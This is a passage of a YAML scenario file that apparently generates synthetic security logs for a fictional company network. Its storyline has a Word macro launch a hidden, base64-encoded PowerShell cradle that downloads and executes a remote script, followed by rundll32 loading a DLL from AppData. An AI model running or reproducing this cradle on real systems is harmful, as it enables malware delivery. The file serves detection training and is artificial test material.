    - termservice
  - hostname: WS-NBLAKE-01
    ip: 10.40.10.24
    os: Windows 11 Enterprise
    type: workstation
    assigned_user: nora.blake
    services:
    - dns-client
    - termservice
  - hostname: DC-NWD-01
    ip: 10.40.20.10
    os: Windows Server 2022
    type: domain_controller
    services:
    - kerberos
    - ldap
    - dns
    roles:
    - domain_controller
    - dns_server
  - hostname: FILE-NWD-01
    ip: 10.40.20.20
    os: Windows Server 2022
    type: server
    services:
    - smb
    - dns-client
    roles:
    - file_server
  - hostname: PROXY-NWD-01
    ip: 10.40.20.30
    os: Ubuntu 22.04 LTS
    type: server
    services:
    - squid
    - dns-client
    roles:
    - forward_proxy
  network:
    public_cidrs:
    - 198.18.0.0/28
    segments:
    - name: workstations
      cidr: 10.40.10.0/24
      exposure: internal
      systems:
      - WS-ICHEN-01
      - WS-LMARTINS-01
      - WS-SOKAFOR-01
      - WS-NBLAKE-01
    - name: servers
      cidr: 10.40.20.0/24
      exposure: internal
      systems:
      - DC-NWD-01
      - FILE-NWD-01
      - PROXY-NWD-01
    sensors:
    - type: network
      name: core-span
      hostname: ZEEK-CORE
      monitoring_segments:
      - workstations
      - servers
      direction: bidirectional
      placement: span
      log_formats:
      - zeek
time_window:
  start: '2026-10-27T13:00:00Z'
  duration: 2h
  warmup: 1h
generation_seed: 7053
baseline_activity:
  description: Quiet afternoon
  intensity: low
  variation: low
  suspicious_noise: low
observation_profile: complete
storyline:
- id: logon
  time: +40m
  actor: ivy.chen
  system: WS-ICHEN-01
  activity: Interactive logon
  events:
  - type: logon
    logon_type: 2
- id: macro
  time: +45m
  actor: ivy.chen
  system: WS-ICHEN-01
  activity: Macro launches encoded PowerShell cradle and rundll32
  events:
  - type: process
    process_ref: word
    process_name: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
    command_line: '"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\ivy.chen\Downloads\Statement.docm"'
  - type: process
    process_ref: ps
    parent_ref: word
    process_name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    command_line: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AbgB3AGQALQBpAHQALwB0AG8AbwBsAHMALwBtAGEAaQBuAC8AdQAuAHAAcwAxACcAKQA=
  - type: connection
    dst_ip: 185.199.110.133
    dst_port: 443
    hostname: raw.githubusercontent.com
    service: ssl
    orig_bytes: 1300
    resp_bytes: 52000
  - type: process
    parent_ref: ps
    process_name: C:\Windows\System32\rundll32.exe
    command_line: rundll32.exe C:\Users\ivy.chen\AppData\Roaming\svchelper.dll,Init
output:
  logs:
  - format: windows_event_security
  - format: windows_event_sysmon
  - format: zeek_conn
  - format: zeek_dns
  - format: zeek_ssl
  - format: proxy_access
  destination: out/T053
  compression: false
